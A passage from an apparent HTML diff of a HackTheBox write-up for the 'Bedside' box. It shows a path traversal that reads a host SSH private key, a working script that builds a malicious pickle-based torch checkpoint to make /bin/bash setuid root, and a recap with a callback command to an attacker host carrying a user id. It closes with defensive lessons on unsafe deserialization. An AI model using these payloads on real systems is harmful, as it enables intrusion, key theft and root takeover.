+for f in .ssh/id_ed25519 .ssh/id_rsa .ssh/id_ecdsa; do
+  echo "== $f =="; curl -s --path-as-is "$T/$B/$f" | head -1
+done</span>
+<span class="po">== .ssh/id_ed25519 ==
+</span><span class="pr">Not Found</span><span class="po">
+== .ssh/id_rsa ==
+</span><span class="pg">-----BEGIN OPENSSH PRIVATE KEY-----</span><span class="po">
+== .ssh/id_ecdsa ==
+</span><span class="pr">Not Found</span><span class="po">
+
+</span><span class="pd">$ </span><span class="pc">curl -s --path-as-is "$T/$B/user.txt"</span>
+<span class="pg">4d6ea9a8…  </span><span class="pco"># user.txt</span></div>
+  </div>
+
+  <p>An unencrypted ed25519 key (stored as <code>id_rsa</code>), comment <code>developer@bedside</code>. Fix its perms and walk straight onto the host, out of the container for good:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">onto the host as developer</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">chmod 600 dev_key; ssh -i dev_key developer@&lt;IP&gt; 'id; sudo -n -l'</span>
+<span class="po">uid=1000(developer) gid=1000(developer) groups=1000(developer),100(users)
+User developer may run the following commands on bedside:
+    (ALL) NOPASSWD: </span><span class="py">/usr/bin/python3 /opt/trainer/bedside_trainer.py</span></div>
+  </div>
+
+  <!-- ══ ROOT ══ -->
+  <h2>Privilege escalation — the second dose</h2>
+
+  <p>One command, no password: a MONAI training script run as root. Reading it, the vulnerable line stands out immediately — it resumes from the newest checkpoint using MONAI's <code>CheckpointLoader</code>, which calls <code>torch.load(…, weights_only=False)</code> under the hood, and <code>torch.load</code> deserializes with <code>pickle</code>. The same wound as the foothold, wearing a different coat: feed it a malicious <code>.pt</code> and its <code>__reduce__</code> runs as root.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">/opt/trainer/bedside_trainer.py (excerpt)</span>
+    </div>
+    <div class="term-body"><span class="po">latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)   </span><span class="pco"># newest *.pt in /datastore/checkpoints</span><span class="po">
+if latest_ckpt:
+    loader = CheckpointLoader(load_path=str(latest_ckpt),
+                              load_dict={"model": model, "optimizer": optimizer})
+    loader(engine)   </span><span class="pco"># -&gt; torch.load(weights_only=False) -&gt; pickle.load -&gt; RCE</span></div>
+  </div>
+
+  <p>The plan writes itself — plant a malicious checkpoint in <code>/datastore/checkpoints/</code>, run the trainer, get root — but the script has guards that turn a one-liner into a fight.</p>
+
+  <h3>Guard 1 — the data gate</h3>
+
+  <p>The trainer never reaches the checkpoint loader unless it has data to train on. It scans <code>/datastore/processed/</code> for valid images and exits early if empty. And <code>developer</code> can't write <code>/datastore</code> at all — it's <code>datawrangler:dataops</code>, and <code>developer</code> isn't in <code>dataops</code>. But my container shell <em>is</em>. The shared <code>/datastore</code> volume is the seam: <strong>datawrangler writes the files, developer pulls the trigger.</strong> Two shells, one exploit. So I seed a valid PNG into <code>processed/</code> — with data present, the trainer skips promotion-from-staging entirely and marches to the loader.</p>
+
+  <h3>Guard 2 — the format check</h3>
+
+  <p>A raw pickle won't do. <code>torch.load</code> expects a real torch archive: a ZIP containing <code>archive/data.pkl</code> (the pickled object graph) plus <code>archive/version</code>. So I build one properly — a ZIP whose <code>data.pkl</code> is a dict-shaped payload whose <code>__reduce__</code> runs <code>chmod u+s /bin/bash</code>. No torch needed on either side; pure <code>zipfile</code> + <code>pickle</code> on macOS:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">build_evil_pt.py — a valid torch checkpoint carrying pickle RCE</span>
+    </div>
+    <div class="term-body"><span class="pb">import</span><span class="po"> pickle, os, zipfile</span>
+<span class="pb">class</span><span class="pc"> RCE</span><span class="po">:
+    </span><span class="pb">def</span><span class="pc"> __reduce__</span><span class="po">(self):
+        </span><span class="pb">return</span><span class="po"> (os.system, ("chmod u+s /bin/bash",))
+payload = pickle.dumps({"model": RCE()}, protocol=2)
+with zipfile.ZipFile("evil.pt","w",zipfile.ZIP_STORED) as z:
+    z.writestr("archive/data.pkl", payload)
+    z.writestr("archive/version", "3\n")</span>
+<span class="pco"># magic bytes 50 4b 03 04 == PK == valid ZIP == valid torch archive</span></div>
+  </div>
+
+  <p>Both files reach the box <em>through the portal</em> — no need to host anything. <code>scan.png</code> is already allowed; <code>evil.pt</code> is a valid ZIP, so I upload it renamed <code>evil.zip</code> and it sails past the MIME check. Then a single pickle-RCE payload (fired the same two-file way) copies them out of <code>uploads/</code> into <code>/datastore</code> as <code>datawrangler</code>, and drops a cleanup loop so the watcher's stray <code>.txt</code> output can never break the pipeline:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">stage payloads via the portal, plant from the container</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">cp evil.pt evil.zip</span>
+<span class="pd">$ </span><span class="pc">curl -s -H "Host: research.bedside.htb" -F "uploadFile=@evil.zip;type=application/zip" http://&lt;IP&gt;/</span>
+<span class="pd">$ </span><span class="pc">curl -s -H "Host: research.bedside.htb" -F "uploadFile=@scan.png;type=image/png"     http://&lt;IP&gt;/</span>
+
+<span class="pco"># then, delivered as the pickle __reduce__ command (runs as datawrangler in the container):</span>
+<span class="pc">U=/var/www/research.bedside.htb/uploads
+cp $U/evil.zip  /datastore/checkpoints/checkpoint_epoch_99.pt
+cp $U/scan.png  /datastore/processed/scan.png
+setsid sh -c 'while true; do rm -f /datastore/staging/*.txt /datastore/processed/*.txt 2&gt;/dev/null; \
+              cp $U/scan.png /datastore/processed/scan.png 2&gt;/dev/null; sleep 0.3; done' &amp;</span></div>
+  </div>
+
+  <h3>Firing it</h3>
+
+  <p>With a valid checkpoint in place and the pipeline held clean, run the sudo trainer from the <code>developer</code> shell. <code>torch.load</code> unpickles my checkpoint as root and <code>__reduce__</code> fires:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">root</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py 2&gt;&amp;1 | tail -2</span>
+<span class="pr">TypeError: Expected state_dict to be dict-like, got &lt;class 'int'&gt;.</span>
+<span class="pd">$ </span><span class="pc">ls -la /bin/bash</span>
+<span class="pg">-rwsr-xr-x 1 root root 1298416 /bin/bash</span>
+<span class="pd">$ </span><span class="pc">/bin/bash -p -c 'id; cat /root/root.txt'</span>
+<span class="po">uid=1000(developer) </span><span class="pg">euid=0(root)</span><span class="po"> groups=1000(developer),100(users)
+7e529abc…  </span><span class="pco"># root.txt</span></div>
+  </div>
+
+  <p>That <code>TypeError</code> looks like another failure. It isn't. <code>os.system</code> returns an integer exit code, and torch's loader expected a dict, so it raised on the return value — but that return value only exists <em>because the command already ran</em>. The exception fires after the payload, not instead of it. One line down, the <code>s</code> bits on <code>/bin/bash</code> are set, and <code>/bin/bash -p</code> keeps <code>euid=0</code>. Root.</p>
+
+  <!-- ══ RECAP ══ -->
+  <h2>The whole chain, one screen</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">recap</span>
+    </div>
+    <div class="term-body"><span class="pco"># 1. vhost → research.bedside.htb runs pdfminer.six (X-Powered-By header)</span>
+<span class="pc">ffuf -u http://bedside.htb -H "Host: FUZZ.bedside.htb" -w subdomains.txt -fc 301</span>
+
+<span class="pco"># 2. CVE-2025-64512: two files — malicious pickle + trigger PDF that names it</span>
+<span class="pc">python3 build_and_send.py 'curl -s http://&lt;VPN&gt;:8000/HIT-$(id -un)'   # RCE as datawrangler</span>
+
+<span class="pco"># 3. internal :3000 static server path traversal → host SSH key + user.txt</span>
+<span class="pc">curl -s --path-as-is 'http://172.17.0.1:3000/../../../../home/developer/.ssh/id_rsa'</span>
+
+<span class="pco"># 4. SSH as developer; sudo runs a MONAI trainer that torch.load()s a checkpoint</span>
+<span class="pc">ssh -i dev_key developer@&lt;IP&gt;   # sudo -n -l → NOPASSWD bedside_trainer.py</span>
+
+<span class="pco"># 5. plant a malicious .pt (as datawrangler, via shared /datastore) → root</span>
+<span class="pc">python3 build_evil_pt.py   # zip: archive/data.pkl __reduce__ = chmod u+s /bin/bash</span>
+<span class="pc">sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py; /bin/bash -p -c 'cat /root/root.txt'</span></div>
+  </div>
+
+  <!-- ══ LESSONS ══ -->
+  <h2>Lessons</h2>
+
+  <p>Bedside runs on a single anti-pattern repeated: <strong>deserializing data you don't control</strong>. pdfminer did it with <code>pickle</code> to load a font map; the MONAI trainer did it again with <code>torch.load</code> to restore a checkpoint. Neither is exotic — both are the default, convenient way to do a normal job, and both hand code execution the moment the input turns hostile. If you take one thing from this box, let it be that <code>pickle.loads</code>, <code>torch.load(weights_only=False)</code> and <code>yaml.load</code> are <em>not file readers</em>. They are code executors that happen to accept files. Set <code>weights_only=True</code>, use <code>safetensors</code>, and validate before you deserialize.</p>
+
+  <ul>
+    <li><strong>Read, don't guess.</strong> Every wall on this box had a sign on it — the whitelist's hidden <code>gz/zip</code>, the storage path in a MIME error, the <code>*.pdf</code> glob in the watcher, the <code>"// For demo"</code> comment that exposed the port-3000 API as fake. Every sign was in the source or the error message, not in my assumptions.</li>
+    <li><strong>Uploading isn't parsing.</strong> The one-file polyglot was correct and inert because nothing consumed it on upload. Understanding <em>what</em> processes your input, and <em>when</em>, mattered more than the payload itself.</li>
+    <li><strong>Shared volumes are trust boundaries.</strong> <code>developer</code> couldn't write <code>/datastore</code>, but a second identity that shared the volume could. The privesc was a two-shell coordination, not a single command.</li>
+    <li><strong>Request/response beats reverse shells.</strong> Callbacks, a POST-collecting listener, path-traversal reads, and an SSH key — every step was pull-based. No inbound shell to babysit, and a quieter footprint.</li>
+  </ul>
+
+  <p>Two flags, one clinic that trusted its machines exactly twice too often.</p>
+
+</div>
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← All posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
